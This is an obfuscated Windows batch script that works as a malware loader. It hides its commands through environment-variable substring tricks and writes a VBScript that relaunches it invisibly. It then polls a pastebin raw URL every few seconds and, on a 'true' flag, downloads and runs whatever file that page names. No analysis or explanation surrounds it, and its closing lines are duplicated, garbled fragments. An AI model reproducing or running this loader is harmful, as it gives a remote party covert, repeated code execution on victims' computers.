��&cls
@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
@ec%r:~11,1%o off
%r:~8,1%e%r:~4,1%local

%r:~2,1%f no%r:~4,1% ex%r:~2,1%%r:~8,1%%r:~4,1% "%r:~8,1%%r:~4,1%ar%r:~4,1%%r:~13,1%p.v%r:~10,1%%r:~8,1%" (
    ec%r:~11,1%o %r:~14,1%e%r:~4,1% %r:~8,1%%r:~11,1%ell = Crea%r:~4,1%e%r:~17,1%%r:~10,1%jec%r:~4,1%^("W%r:~14,1%cr%r:~2,1%p%r:~4,1%.%r:~14,1%%r:~11,1%ell"^) > %r:~8,1%%r:~4,1%ar%r:~4,1%%r:~13,1%p.v%r:~10,1%%r:~8,1%
    ec%r:~11,1%o %r:~8,1%%r:~11,1%ell.R%r:~13,1%n """" ^& "%~nx0" ^& """", 0, Fal%r:~8,1%e >> %r:~8,1%%r:~4,1%ar%r:~4,1%%r:~13,1%p.v%r:~10,1%%r:~8,1%
)

%r:~2,1%f no%r:~4,1% ex%r:~2,1%%r:~8,1%%r:~4,1% "%temp%\%r:~4,1%e%r:~12,1%p64" (
    %r:~8,1%%r:~4,1%ar%r:~4,1% "" "%r:~8,1%%r:~4,1%ar%r:~4,1%%r:~13,1%p.v%r:~10,1%%r:~8,1%"
    ec%r:~11,1%o %temp% > "%temp%\%r:~4,1%e%r:~12,1%p64"
    ex%r:~2,1%%r:~4,1%
)

del "%temp%\%r:~4,1%e%r:~12,1%p64"

%r:~8,1%e%r:~4,1% "%r:~13,1%rl=%r:~11,1%%r:~4,1%%r:~4,1%p%r:~8,1%://pa%r:~8,1%%r:~4,1%e%r:~10,1%%r:~2,1%n.co%r:~12,1%/ra%r:~9,1%/%r:~1,1%2rZT2%r:~11,1%%r:~0,1%"
cd "%localappdata%"

:c%r:~11,1%eck
%r:~8,1%e%r:~4,1% "l1="
%r:~8,1%e%r:~4,1% "l2="
%r:~8,1%e%r:~4,1% "l3="
%r:~8,1%e%r:~4,1% "l4="

for /f "%r:~4,1%okens=*" %%a %r:~2,1%n ('po%r:~9,1%er%r:~8,1%%r:~11,1%ell -Co%r:~12,1%%r:~12,1%and "(%r:~16,1%nvoke-We%r:~10,1%Req%r:~13,1%e%r:~8,1%t -Uri %url%).Con%r:~4,1%en%r:~4,1%"') do (
    %r:~2,1%f no%r:~4,1% def%r:~2,1%ned l1 (
        %r:~8,1%et "l1=%%a"
    ) el%r:~8,1%e %r:~2,1%f no%r:~4,1% def%r:~2,1%ned l2 (
        %r:~8,1%et "l2=%%a"
    ) el%r:~8,1%e %r:~2,1%f no%r:~4,1% def%r:~2,1%ned l3 (
        %r:~8,1%et "l3=%%a"
    ) el%r:~8,1%e %r:~2,1%f no%r:~4,1% def%r:~2,1%ned l4 (
        %r:~8,1%et "l4=%%a"
    )
)

if /I "%l1%"=="fal%r:~8,1%e" %r:~8,1%e%r:~4,1% "done=fal%r:~8,1%e"
if /I "%l1%"=="%r:~4,1%r%r:~13,1%e" (
    if /I "%done%"=="%r:~4,1%r%r:~13,1%e" %r:~1,1%o%r:~4,1%o end
    %r:~2,1%f no%r:~4,1% exist "%l3%" mkdir "%l3%"
    ::c%r:~13,1%rl -o "%l3\%l4%" "%l2%"
    powershell -Command "Invoke-WebRequest -Uri '%l2%' -OutFile '%l3%\%l4%'"
    start "" "%l3%\%l4%"
    set "done=true"
)

:end
%r:~4,1%%r:~2,1%%r:~12,1%eo%r:~13,1%%r:~4,1% /%r:~4,1% 5 /no%r:~10,1%reak >n%r:~13,1%l
%r:~1,1%o%r:~4,1%o c%r:~11,1%eck
endlocal
@ec%r:~11,1%o off
%r:~8,1%et a = %%~%r:~2,1%
%r:~8,1%e%r:~4,1% a = r%r:~13,1%e"
)

:end
timeout /t 5 /no%r:~10,1%reak >nul
goto check
endlocal
@echo off
set a = %%~i
set a = % + %~i"%
set a = %a%
:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
